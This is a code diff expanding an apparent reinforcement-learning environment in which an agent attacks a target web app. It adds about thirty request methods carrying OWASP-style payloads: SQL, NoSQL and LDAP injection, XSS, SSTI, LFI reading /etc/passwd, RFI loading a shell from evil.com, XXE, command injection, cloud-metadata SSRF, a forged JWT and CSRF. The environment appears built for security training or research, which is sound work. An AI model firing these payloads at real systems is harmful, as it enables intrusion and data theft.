@@ -37,10 +37,16 @@ class WebSecurityGym(gym.Env):
         # The Arsenal: Tools the agent can use
         self.payload_manager = PayloadManager()
         
-        # Actions: The agent has 15 possible moves
-        # 0-2: Navigation
-        # 3-14: Attacks
-        self.action_space = spaces.Discrete(15)
+        # Actions: The agent now has 45 possible moves (OWASP Top 10 2025 Complete)
+        # 0-5: Navigation
+        # 6-15: SQL Injection (Classic, Blind, Time-based, JSON, NoSQL)
+        # 16-22: XSS (Reflected, Stored, DOM, Polyglot, CSP Bypass)
+        # 23-27: File Inclusion (LFI, RFI, Path Traversal, XXE)
+        # 28-32: SSRF & CSRF
+        # 33-37: Authentication & Authorization (JWT, OAuth, IDOR, BAC)
+        # 38-42: Deserialization, Business Logic, Race Conditions
+        # 43-44: Utility actions
+        self.action_space = spaces.Discrete(45)
         
         # Observations: The agent sees 10 features about the current page
         # 1. Current Page ID
@@ -75,23 +81,68 @@ class WebSecurityGym(gym.Env):
         self.max_steps_per_episode: int = 30
         self.steps_taken: int = 0
         
-        # Map Action IDs to Functions
+        # Map Action IDs to Functions - OWASP Top 10 2025 Complete
         self.action_book = {
+            # Navigation (0-5)
             0: self.navigate_home,
             1: self.navigate_login,
             2: self.navigate_search,
-            3: self.attack_sqli_api_login,      # CTF: Gate Keeper SQLi
-            4: self.attack_xss_api_comment,     # CTF: Payload XSS
-            5: self.navigate_post,
-            6: self.navigate_profile,
-            7: self.attack_bac_admin_users,     # CTF: Sys Admin Dump
-            8: self.attack_fuzzing,             # NEW: Fuzzing
-            9: self.attack_idor_profile,
-            10: self.attack_ssrf_preview,
-            11: self.action_wait,
-            12: self.action_login_valid,        # Get valid Token
-            13: self.attack_sqli_time_based,    # NEW: Time-based SQLi
-            14: self.attack_xss_polyglot,       # NEW: Polyglot XSS
+            3: self.navigate_post,
+            4: self.navigate_profile,
+            5: self.navigate_api_docs,
+            
+            # SQL Injection (6-15) - A05: Injection
+            6: self.attack_sqli_classic,
+            7: self.attack_sqli_union,
+            8: self.attack_sqli_time_based,
+            9: self.attack_sqli_blind,
+            10: self.attack_sqli_json,
+            11: self.attack_sqli_api_login,
+            12: self.attack_nosql_injection,
+            13: self.attack_graphql_injection,
+            14: self.attack_ldap_injection,
+            15: self.attack_sqli_waf_bypass,
+            
+            # XSS (16-22) - A05: Injection
+            16: self.attack_xss_reflected,
+            17: self.attack_xss_stored,
+            18: self.attack_xss_dom,
+            19: self.attack_xss_polyglot,
+            20: self.attack_xss_csp_bypass,
+            21: self.attack_xss_api_comment,
+            22: self.attack_ssti,
+            
+            # File Inclusion & XXE (23-27) - A05: Injection
+            23: self.attack_lfi,
+            24: self.attack_rfi,
+            25: self.attack_path_traversal,
+            26: self.attack_xxe,
+            27: self.attack_command_injection,
+            
+            # SSRF & CSRF (28-32) - A10: SSRF
+            28: self.attack_ssrf_internal,
+            29: self.attack_ssrf_cloud_metadata,
+            30: self.attack_ssrf_preview,
+            31: self.attack_csrf_transfer,
+            32: self.attack_open_redirect,
+            
+            # Authentication & Authorization (33-37) - A01, A07
+            33: self.attack_jwt_none_algorithm,
+            34: self.attack_oauth_bypass,
+            35: self.attack_idor_profile,
+            36: self.attack_bac_admin_users,
+            37: self.attack_session_fixation,
+            
+            # Advanced Attacks (38-42) - A06, A08
+            38: self.attack_deserialization,
+            39: self.attack_business_logic,
+            40: self.attack_race_condition,
+            41: self.attack_mass_assignment,
+            42: self.attack_prototype_pollution,
+            
+            # Utility Actions (43-44)
+            43: self.action_login_valid,
+            44: self.action_wait,
         }
     
     def _setup_browser_session(self) -> None:
@@ -385,6 +436,196 @@ class WebSecurityGym(gym.Env):
         )
         reward = self._calculate_reward(r, "XSS_REFLECTED")
         return r, reward
+    
+    # ========================================================================
+    # NEW OWASP TOP 10 2025 ATTACK METHODS
+    # ========================================================================
+    
+    # Navigation Methods
+    def navigate_api_docs(self) -> Tuple[requests.Response, float]:
+        """Navigate to API documentation."""
+        r = self.session.get(f"{self.target_url}/swagger", timeout=3)
+        return r, 0.0
+    
+    # SQL Injection Variants
+    def attack_sqli_classic(self) -> Tuple[requests.Response, float]:
+        """Classic SQL Injection."""
+        payload = self.payload_manager.get_sqli("simple")
+        r = self.session.get(f"{self.target_url}/search?q={payload}", timeout=3)
+        return r, self._calculate_reward(r, "SQL_SEARCH")
+    
+    def attack_sqli_union(self) -> Tuple[requests.Response, float]:
+        """UNION-based SQL Injection."""
+        r = self.session.get(f"{self.target_url}/search?q=' UNION SELECT 1,2,3--", timeout=3)
+        return r, self._calculate_reward(r, "SQL_UNION")
+    
+    def attack_sqli_blind(self) -> Tuple[requests.Response, float]:
+        """Blind SQL Injection."""
+        r = self.session.get(f"{self.target_url}/search?q=' AND 1=1--", timeout=3)
+        return r, self._calculate_reward(r, "SQL_BLIND")
+    
+    def attack_sqli_json(self) -> Tuple[requests.Response, float]:
+        """JSON-based SQL Injection (WAF bypass)."""
+        payload = self.payload_manager.get_sqli("json")
+        r = self.session.post(f"{self.target_url}/api/v1/users", json={"username": payload}, timeout=3)
+        return r, self._calculate_reward(r, "SQL_JSON")
+    
+    def attack_nosql_injection(self) -> Tuple[requests.Response, float]:
+        """NoSQL Injection."""
+        r = self.session.post(f"{self.target_url}/nosql_login", 
+                             json={"username": {"$ne": None}, "password": {"$ne": None}}, timeout=3)
+        return r, self._calculate_reward(r, "NOSQL")
+    
+    def attack_graphql_injection(self) -> Tuple[requests.Response, float]:
+        """GraphQL Injection."""
+        r = self.session.post(f"{self.target_url}/graphql", 
+                             json={"query": "{ user(id: 1' OR '1'='1) { username } }"}, timeout=3)
+        return r, self._calculate_reward(r, "GRAPHQL")
+    
+    def attack_ldap_injection(self) -> Tuple[requests.Response, float]:
+        """LDAP Injection."""
+        r = self.session.get(f"{self.target_url}/ldap_search?username=*)(uid=*))(|(uid=*", timeout=3)
+        return r, self._calculate_reward(r, "LDAP")
+    
+    def attack_sqli_waf_bypass(self) -> Tuple[requests.Response, float]:
+        """SQL Injection with WAF bypass techniques."""
+        payload = self.payload_manager.get_sqli("bypass")
+        r = self.session.get(f"{self.target_url}/search?q={payload}", timeout=3)
+        return r, self._calculate_reward(r, "SQL_WAF_BYPASS")
+    
+    # XSS Variants
+    def attack_xss_reflected(self) -> Tuple[requests.Response, float]:
+        """Reflected XSS."""
+        payload = self.payload_manager.get_xss("simple")
+        r = self.session.get(f"{self.target_url}/search?q={payload}", timeout=3)
+        return r, self._calculate_reward(r, "XSS_REFLECTED")
+    
+    def attack_xss_stored(self) -> Tuple[requests.Response, float]:
+        """Stored XSS via comment."""
+        if not self.auth_token:
+            return None, -5.0
+        payload = self.payload_manager.get_xss("simple")
+        r = self.session.post(f"{self.target_url}/api/v1/interact/comment_x",
+                             json={"payload": payload, "target_id": 1},
+                             headers={"Authorization": f"Bearer {self.auth_token}"}, timeout=3)
+        return r, self._calculate_reward(r, "XSS_STORED")
+    
+    def attack_xss_dom(self) -> Tuple[requests.Response, float]:
+        """DOM-based XSS."""
+        r = self.session.get(f"{self.target_url}/#<script>alert(1)</script>", timeout=3)
+        return r, self._calculate_reward(r, "XSS_DOM")
+    
+    def attack_xss_csp_bypass(self) -> Tuple[requests.Response, float]:
+        """XSS with CSP bypass."""
+        payload = self.payload_manager.get_xss("csp_bypass")
+        r = self.session.get(f"{self.target_url}/search?q={payload}", timeout=3)
+        return r, self._calculate_reward(r, "XSS_CSP")
+    
+    def attack_ssti(self) -> Tuple[requests.Response, float]:
+        """Server-Side Template Injection."""
+        r = self.session.get(f"{self.target_url}/template?name={{{{7*7}}}}", timeout=3)
+        return r, self._calculate_reward(r, "SSTI")
+    
+    # File Inclusion & Command Injection
+    def attack_lfi(self) -> Tuple[requests.Response, float]:
+        """Local File Inclusion."""
+        r = self.session.get(f"{self.target_url}/read_file?file=../../etc/passwd", timeout=3)
+        return r, self._calculate_reward(r, "LFI")
+    
+    def attack_rfi(self) -> Tuple[requests.Response, float]:
+        """Remote File Inclusion."""
+        r = self.session.get(f"{self.target_url}/include_page?page=http://evil.com/shell.php", timeout=3)
+        return r, self._calculate_reward(r, "RFI")
+    
+    def attack_path_traversal(self) -> Tuple[requests.Response, float]:
+        """Path Traversal."""
+        r = self.session.get(f"{self.target_url}/download?file=../../../etc/passwd", timeout=3)
+        return r, self._calculate_reward(r, "PATH_TRAVERSAL")
+    
+    def attack_xxe(self) -> Tuple[requests.Response, float]:
+        """XML External Entity Injection."""
+        xxe_payload = '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>'
+        r = self.session.post(f"{self.target_url}/parse_xml", data=xxe_payload, timeout=3)
+        return r, self._calculate_reward(r, "XXE")
+    
+    def attack_command_injection(self) -> Tuple[requests.Response, float]:
+        """Command Injection."""
+        r = self.session.post(f"{self.target_url}/ping", json={"host": "localhost; whoami"}, timeout=3)
+        return r, self._calculate_reward(r, "COMMAND_INJECTION")
+    
+    # SSRF & CSRF
+    def attack_ssrf_internal(self) -> Tuple[requests.Response, float]:
+        """SSRF to access internal network."""
+        r = self.session.post(f"{self.target_url}/fetch_url", json={"url": "http://localhost:22"}, timeout=3)
+        return r, self._calculate_reward(r, "SSRF_INTERNAL")
+    
+    def attack_ssrf_cloud_metadata(self) -> Tuple[requests.Response, float]:
+        """SSRF to access cloud metadata."""
+        r = self.session.post(f"{self.target_url}/fetch_url", 
+                             json={"url": "http://169.254.169.254/latest/meta-data/"}, timeout=3)
+        return r, self._calculate_reward(r, "SSRF_CLOUD")
+    
+    def attack_csrf_transfer(self) -> Tuple[requests.Response, float]:
+        """CSRF attack on money transfer."""
+        r = self.session.post(f"{self.target_url}/transfer_money", 
+                             json={"to_user": "attacker", "amount": "1000"}, timeout=3)
+        return r, self._calculate_reward(r, "CSRF")
+    
+    def attack_open_redirect(self) -> Tuple[requests.Response, float]:
+        """Open Redirect vulnerability."""
+        r = self.session.get(f"{self.target_url}/redirect?url=http://evil.com", timeout=3)
+        return r, self._calculate_reward(r, "OPEN_REDIRECT")
+    
+    # Authentication & Authorization
+    def attack_jwt_none_algorithm(self) -> Tuple[requests.Response, float]:
+        """JWT None Algorithm bypass."""
+        import base64
+        header = base64.b64encode(b'{"alg":"none","typ":"JWT"}').decode()
+        payload = base64.b64encode(b'{"user":"admin","role":"admin"}').decode()
+        fake_token = f"{header}.{payload}."
+        r = self.session.get(f"{self.target_url}/profile", 
+                            headers={"Authorization": f"Bearer {fake_token}"}, timeout=3)
+        return r, self._calculate_reward(r, "JWT_NONE")
+    
+    def attack_oauth_bypass(self) -> Tuple[requests.Response, float]:
+        """OAuth redirect bypass."""
+        r = self.session.get(f"{self.target_url}/oauth_callback?redirect_uri=http://evil.com", timeout=3)
+        return r, self._calculate_reward(r, "OAUTH_BYPASS")
+    
+    def attack_session_fixation(self) -> Tuple[requests.Response, float]:
+        """Session Fixation attack."""
+        r = self.session.get(f"{self.target_url}/set_session?session_id=attacker_session", timeout=3)
+        return r, self._calculate_reward(r, "SESSION_FIXATION")
+    
+    # Advanced Attacks
+    def attack_deserialization(self) -> Tuple[requests.Response, float]:
+        """Insecure Deserialization."""
+        import pickle, base64
+        malicious_obj = base64.b64encode(pickle.dumps("test")).decode()
+        r = self.session.post(f"{self.target_url}/deserialize", json={"data": malicious_obj}, timeout=3)
+        return r, self._calculate_reward(r, "DESERIALIZATION")
+    
+    def attack_business_logic(self) -> Tuple[requests.Response, float]:
+        """Business Logic Flaw (negative quantity)."""
+        r = self.session.post(f"{self.target_url}/purchase", json={"product_id": 1, "quantity": -999}, timeout=3)
+        return r, self._calculate_reward(r, "BUSINESS_LOGIC")
+    
+    def attack_race_condition(self) -> Tuple[requests.Response, float]:
+        """Race Condition attack."""
+        r = self.session.post(f"{self.target_url}/race_condition", json={"user_id": 1, "amount": 100}, timeout=3)
+        return r, self._calculate_reward(r, "RACE_CONDITION")
+    
+    def attack_mass_assignment(self) -> Tuple[requests.Response, float]:
+        """Mass Assignment vulnerability."""
+        r = self.session.post(f"{self.target_url}/update_profile", 
+                             json={"username": "hacker", "is_admin": True, "credit_balance": 999999}, timeout=3)
+        return r, self._calculate_reward(r, "MASS_ASSIGNMENT")
+    
+    def attack_prototype_pollution(self) -> Tuple[requests.Response, float]:
+        """Prototype Pollution attack."""
+        r = self.session.post(f"{self.target_url}/merge_config", 
+                             json={"__proto__": {"isAdmin": True}}, timeout=3)
+        return r, self._calculate_reward(r, "PROTOTYPE_POLLUTION")
 
     def action_wait(self) -> Tuple[None, float]:
         """Wait for a moment (to bypass rate limits)."""
